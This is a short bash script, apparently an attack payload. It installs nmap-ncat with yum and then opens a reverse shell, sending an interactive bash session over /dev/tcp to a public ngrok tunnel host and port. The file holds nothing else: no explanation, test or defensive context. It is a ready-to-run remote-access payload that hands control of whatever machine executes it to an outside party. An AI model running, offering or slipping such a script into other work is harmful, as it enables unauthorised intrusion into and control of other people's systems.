#!/bin/bash
yum install -y nmap-ncat
bash -i >& /dev/tcp/0.tcp.jp.ngrok.io/16678  0>&1

